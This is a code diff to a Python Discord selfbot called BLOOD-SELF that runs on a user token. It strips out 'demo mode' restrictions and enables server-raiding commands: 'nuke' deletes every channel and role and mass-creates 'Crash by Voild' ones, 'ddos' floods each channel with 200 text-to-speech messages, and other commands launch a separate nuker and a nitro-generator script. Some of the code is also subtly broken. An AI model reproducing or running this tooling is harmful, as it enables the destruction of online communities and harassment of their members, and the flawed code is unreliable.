@@ -105,8 +105,13 @@ import threading
 import ctypes
 from threading import Thread
 from requests import Session
+
 from time import strftime, gmtime, sleep
 from sys import stdout
+try:
+    import requests 
+except:
+    os.system('pip install requests')
 
 class Selfbot():
     __version__ = "1.0"
@@ -123,7 +128,7 @@ prefix = ';'
 intents = discord.Intents.all()
 client = commands.Bot(command_prefix = prefix, self_bot = True, intents=intents)
 client.remove_command('help')
-splink = 'Loading...'
+splink = 'BloodNuked'
 
 def time4logs():
     return f'{datetime.datetime.now().strftime("%H:%M:%S")}'
@@ -133,30 +138,24 @@ with open('bloodself.png', 'rb') as foto:
 
 
 prevv = f"""
-#      ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄   ██████ ▓█████  ██▓      █████▒  ╔══════════════<INFO>══════════════╗ 
-#     ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██    ▒ ▓█   ▀ ▓██▒    ▓██   ▒    @Login successful! 
-#     ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌░ ▓██▄   ▒███   ▒██░    ▒████ ░    @Developer - t.me/VoildZero
-#     ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌  ▒   ██▒▒▓█  ▄ ▒██░    ░▓█▒  ░    @Do not copyright! ©
-#     ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ▒██████▒▒░▒████▒░██████▒░▒█░       @Use for ur own risk ⚠
-#     ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░▓  ░ ▒ ░      ╚══════════════<INFO>══════════════╝   
-#     ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ░ ░▒  ░ ░ ░ ░  ░░ ░ ▒  ░ ░      
-#      ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ ░  ░  ░     ░     ░ ░    ░ ░    
-#      ░          ░  ░    ░ ░      ░ ░     ░          ░     ░  ░    ░  ░        
-#           ░                            ░                                      
+ ╔══════════■══════════╗    ▄▄▄▄    ██▓     ▒█████   ▒█████  ▓█████▄   ██████ ▓█████  ██▓      █████▒     ╔══════════■══════════╗
+ I don't wanna live forever ▓█████▄ ▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██    ▒ ▓█   ▀ ▓██▒    ▓██   ▒      - Bloodself{Selfbot.__version__}
+ I just wanna die a king    ▒██▒ ▄██▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌░ ▓██▄   ▒███   ▒██░    ▒████ ░      - Login complete!
+ I don't wanna live forever ▒██░█▀  ▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌  ▒   ██▒▒▓█  ▄ ▒██░    ░▓█▒  ░      - t.me/VoildZero
+ I just wanna die a king    ░▓█  ▀█▓░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ▒██████▒▒░▒████▒░██████▒░▒█░         - https://clck.ru/34ujMB
+ I don't wanna live forever ░▒▓███▀▒░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░▓  ░ ▒ ░         - voild.dll on discord
+ I just wanna die a king    ▒░▒   ░ ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ░ ░▒  ░ ░ ░ ░  ░░ ░ ▒  ░ ░           - Full version
+     "NUKE THE CORD"         ░    ░   ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░ ░  ░  ░     ░     ░ ░    ░ ░         - I love green tea 
+ ╚══════════■══════════╝               ░  ░    ░ ░      ░ ░     ░          ░     ░  ░    ░  ░             ╚══════════■══════════╝   
+                                  ░                            ░                               
 """
 def startprint():
     os.system('CLS')
-    print(Fore.RED + prevv)   
-    print(f"   BLOOD-SELF is protected by {Fore.RED}MIT LICENSE{Fore.RESET}. BLOOD-SELF is a powerful selfbot tool for discord. BLOOD-SELF using power of {Fore.RED}Python{Fore.RESET}")
+    print(Fore.RED + prevv)
     print(f'{Fore.RED}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}')
     print()
-    print(f"   Please, install {Fore.GREEN}all needed files{Fore.RESET} and provide token in {Fore.GREEN}token.txt{Fore.RESET} file!")
-    print()
-    print(f'{Fore.RED}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}')
-    print()
-    print(f'{Fore.RED}⚠DEMO MODE ENABLED ⚠ ')
-    print(f'{Fore.GREEN}{time4logs()} | INFO | Logged as {client.user}{Fore.RESET}')
-    print(f'{Fore.GREEN}{time4logs()} | INFO | Selfbot running with version {Selfbot.__version__}{Fore.RESET}')
+    print(f'{Fore.GREEN} ({time4logs()}) | INFO | Logged as {client.user}{Fore.RESET}')
+    print(f'{Fore.GREEN} ({time4logs()}) | INFO | Selfbot running with version {Selfbot.__version__}{Fore.RESET}')
     
 @client.event
 async def on_ready():
@@ -207,6 +206,9 @@ async def help(ctx):
 {prefix}nitrogen
 {prefix}spam [quantity] <spam text>
 {prefix}support
+{prefix}ddos
+{prefix}nuke
+
 ```""")
 
 @client.command()
@@ -283,106 +285,17 @@ async def status(ctx, argument=None, *, names='BLOOD-SELF'):
 {prefix}status default_stream - standart status  (stream) which at startup
 {prefix}status clear - clear status```""")
         
-@client.command()
-async def fastcrash(ctx):
-    for rolee in ctx.guild.roles:
-        asyncio.create_task(kill_rl(ctx,role=rolee))
-    for channel in ctx.guild.channels:
-        asyncio.create_task(kill_ch(ctx,ch=channel))
-    for _ in range(100):
-        asyncio.create_task(createch(ctx))
-        asyncio.create_task(createrl(ctx))
-    try: 
-        await ctx.guild.edit(name=f'Crash by Blood-self', icon=avatar)
-        print(f'{Fore.GREEN}{time4logs()} [ LOG ] Successfully Crashed!{Fore.RESET}')
-    except:
-        print(f'{Fore.RED}{time4logs()} [ LOG ] Cannot crash the server{Fore.RESET}')
-
-
-@client.command()
-async def crash1(ctx):
-    for a in ctx.guild.roles:
-        try: await a.delete()
-        except: pass
-    for b in ctx.guild.emojis:
-        try: await b.delete()
-        except: pass
-    for c in ctx.guild.channels:
-        try: await c.delete()
-        except: pass
-    try: await ctx.guild.edit(name="Crash by t.me/VoildZero", icon=avatar)
-    except: pass
-    for _ in range(50):
-        try: await ctx.guild.create_text_channel(name="DarkSelf")
-        except: pass
-    for _ in range(50):
-        try: await ctx.guild.create_role(name="Crash by Voild")
-        except: pass
-        
-        
-async def kill_ch(ctx,ch):
-    try:
-        await ch.delete()
-    except:
-        pass
-
-async def kill_rl(ctx,role):
-    try:
-        await role.delete()
-    except: 
-        pass
-
-async def rename_ch(ctx,ch):
-    try:
-        await ch.edit(name=f'Crash by Voild {random.randint(1, 1000)}')
-    except:
-        pass
-
-async def rename_rl(ctx, rl):
-    try:
-        await rl.edit(name=f'Crash by Voild {random.randint(1, 1000)}')
-    except:
-        pass
-
-async def createch(ctx):
-    try:
-        c = await ctx.guild.create_text_channel(f'crash-by-Blood-self' + '-' + ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=8)))
-    except: 
-        pass
-    else:
-        pass
-
-async def createrl(ctx):
-    try:
-        r = await ctx.guild.create_role(f'Crash by Voild {random.randint(1, 1000)}')
-    except:
-        pass
         
 @client.command()
 async def killrl(ctx):
     for role in ctx.guild.roles:
         asyncio.create_task(kill_rl(ctx))
-        
-@client.command()
-async def killch(ctx):
-    for channel in ctx.guild.channels:
-        asyncio.create_task(kill_ch(ctx, ch=channel))
-        print(f'{Fore.GREEN}[{time4logs()} | LOG | channel {channel.name} was deleted!{Fore.RESET}')
 
 @client.command()
 async def ping(ctx):
     ping = round(client.latency * 1000)
     await ctx.send(f"""```\n BLOOD-SELF ping is {str(ping)} ms ✅```""")
     
-@client.command()
-async def spam(ctx, kv, *, text=f'@everyone {splink}'):
-    while int(kv) !=0:
-        await ctx.send(text)
-        kv = int(kv)-1
-        try: 
-            print(f'{Fore.GREEN}{time4logs()} | LOG | Message sent to Channel!{Fore.RESET}')
-        except: 
-            print(f'{Fore.RED}{time4logs()} | LOG | Cannot send message to the channel!{Fore.RESET}')
 
 @client.command()    
 async def reload(ctx):
@@ -402,8 +315,10 @@ async def stopspam(ctx):
 
 @client.command()
 async def destroy(ctx):
-   await ctx.message.add_reaction('⚠️')
-   await ctx.send(f"""```\n Nuker do not avaiable in demo mode...⚠️```""")
+   await ctx.message.add_reaction('✅')
+   await ctx.send(f"""```\n Nuker started...✅```""")
+   print(f"{Fore.RED}({time4logs()}) Nuker started...")
+   Popen('python BLOOD-ServerNuker.py')
    os.system('CLS')
 
 @client.command()
@@ -413,6 +328,7 @@ async def ban(ctx, member: discord.Member, time: int, reason):
   await ctx.send(f"""```{member.mention} **banned** \n reason of ban: *{reason}*✅```""")
   await member.send(f"""```U ar has been banned {ctx.guild.name} for reason {reason}✅```""")
   await member.ban(reason=reason)
+  print(f'{Fore.GREEN}{time4logs()} Ban succesfull!{Fore.RESET}')
 
 
 @client.command()
@@ -437,8 +353,10 @@ async def killchannels(ctx):
                 except:
                     pass
         toc = time.perf_counter()
-        print(f"{Fore.RED}[time] Channels deleting: {toc - tic:0.4f} sec")
+        print(f"{Fore.RED}({time4logs()}) [time] Channels deleting: {toc - tic:0.4f} sec")
     except Exception as e: print(e)
+    await ctx.message.add_reaction('✅')
+
     
 @client.command()    
 async def admin_all(ctx):
@@ -448,7 +366,8 @@ async def admin_all(ctx):
 
     await role.edit(permissions=perms)
     toc = time.perf_counter()
-    print(f"[time] Everyone administrator: {toc - tic:0.4f} sec")
+    print(f"{Fore.RED}({time4logs()}) [time] Everyone administrator: {toc - tic:0.4f} sec")
+    await ctx.message.add_reaction('✅')
     
     
 @client.command()
@@ -464,8 +383,9 @@ async def kill_emoji(ctx):
                 except:
                     pass
         toc = time.perf_counter()
-        print(f"[time] Emoji deleting: {toc - tic:0.4f} sec")
+        print(f"{Fore.RED}({time4logs()}) [time] Emoji deleting: {toc - tic:0.4f} sec")
     except Exception as e: print(e)
+    await ctx.message.add_reaction('✅')
     
 @client.command()
 async def leave(ctx):
@@ -474,13 +394,16 @@ async def leave(ctx):
 @client.command()
 async def logout(ctx):
     await ctx.send(f"""```BLOOD-SELF\n\nSelfbot logged out...✅```""")
+    print(f"{Fore.RED}({time4logs()}) Selfbot logged out...")
     await client.close()
     await os.abort()
 os.system('CLS')
 
 @client.command()    
 async def nitrogen(ctx):
-	 await ctx.send(f"""```BLOOD-SELF\n\nNitro generator disabled in demo mode...⚠️```""")
+	 await ctx.send(f"""```BLOOD-SELF\n\nNitro generator runned...✅```""")
+	 print(f"{Fore.RED}({time4logs()}) Nitro generator runned...")
+	 Popen('python Gen.py')
 	 os.system('CLS')
 	 
 @client.command()
@@ -493,11 +416,73 @@ Special thanks: __morg__ on discord, St3klo#7725 on discord, devyatka_ on discor
 Warning -
 This selfbot created by VoildZero on telegram or voild.dll on discord, made special for GAL server
 and if after using this selfbot u ar getting banned is not my problem! Good Luck!```""")
+    await ctx.message.add_reaction('✅')
+
+@client.command()
+async def spam(ctx, amount:int, *, message):
+    for i in range(amount): 
+        await ctx.send(message)
+        await ctx.message.add_reaction('✅')
+        
+@client.command()
+async def nuke(ctx):
+    icon = await ctx.message.attachments[0].read() if ctx.message.attachments else None
+    await ctx.guild.edit(name=splink, icon=avatar)
+    await ctx.message.add_reaction('✅')
+
+
+    for ch in ctx.guild.channels:
+        try:
+            await ch.delete()
+        except Exception as e:
+            print(e)
+
+
+    while True:
+        try:
+            c = await ctx.guild.create_text_channel(f'crash-by-Blood-self' + '-' + ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=8)))
+        except Exception as e:
+            print(e)
+        else:
+            pass
+
+
+    for rl in ctx.guild.roles:
+        try:
+            await role.delete()
+        except Exception as e:
+            print(e)
+
+
+    while True:
+        try:
+            r = await ctx.guild.create_role(name=f'Crash by Voild {random.randint(1, 1000)}')
+        except Exception as e:
+            print(e)
+
+
+    for ch in ctx.guild.channels:
+        try:
+            await ch.edit(name=f'Crash by Voild {random.randint(1, 1000)}')
+        except Exception as e:
+            print(e)
+            
+
+@client.command()
+async def ddos(ctx,customtext):
+    for channel in ctx.guild.text_channels:
+        for _ in range(200):
+            try:
+                await channel.send(customtext, tts=True)
+                print(f'{Fore.GREEN}{time4logs()} | LOG | message sent to the channel {channel.name}!{Fore.RESET}')
+            except:
+                pass
+            await ctx.message.add_reaction('✅')
+
+    
 
 try:
     client.run(token, bot = False)
 except Exception as exc:
     print(f'{Fore.RED}ERROR | {exc}{Fore.RESET}')
-time.sleep(1000)
-
 
